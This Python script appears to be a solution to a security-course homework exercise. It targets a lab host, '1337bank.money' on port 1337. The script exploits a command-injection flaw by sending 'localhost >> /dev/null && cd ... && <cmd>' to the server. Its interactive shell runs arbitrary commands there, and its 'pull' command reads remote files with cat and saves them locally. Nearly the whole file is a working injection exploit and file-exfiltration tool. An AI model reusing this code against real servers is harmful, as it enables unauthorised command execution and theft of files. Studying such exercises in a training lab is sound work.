"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket

host = "1337bank.money" # IP address here
port = 1337 # Port here

exitProgram = False
startShell = False
pwd = '/'

def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """

    global exitProgram
    global startShell
    
    args = cmd.split()

    if cmd == 'quit':
        exitProgram = True
    elif cmd == 'shell':
        startShell = True
    elif args[0] == 'pull' and len(args) == 3:
        # cat file from server
        res = execute_shell('cat ' + args[1])

        # write to local file
        file = open(args[2], "w")
        file.write(res)
        file.close()
    else:
        print('Commands:')
        print('shell - Drop into an interactive shell on the server, type \"exit\" to quit')
        print('pull <remote-path> <local-path> - Download files')
        print('help - Shows this help menu')
        print('quit - Quit the shell')

def execute_shell(cmd):
    global startShell
    global pwd

    if cmd == 'exit':
        startShell = False
        pwd = '/'
        return

    args = cmd.split()

    # Handle cd
    if args[0] == 'cd' and len(args) >= 2:
        # Back out of subdirectory
        if args[1] == '..':
            prev = pwd.split('/')[:-1]

            # not root already
            if(len(prev) == 0 or prev[0] == ''):
                pwd = '/'
            else:
                pwd = '/'.join(prev)

        # Append subdirectory
        else:
            if pwd != '/':
                pwd += "/"
            else:
                pwd = ''

            pwd += args[1]
        return

    # Establish socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # Handle input message from webserver
    s.recv(1024)

    # send input to server
    s.send("localhost >> /dev/null && cd {} && {}\n".format(pwd, cmd).encode())

    # handle response
    response = s.recv(1024)
    return response.decode()


if __name__ == '__main__':
    while exitProgram == False:
        if startShell:
            response = execute_shell(input(pwd + "> "))
            if response != None:
                print(response)
        else:
            execute_cmd(input('> '))
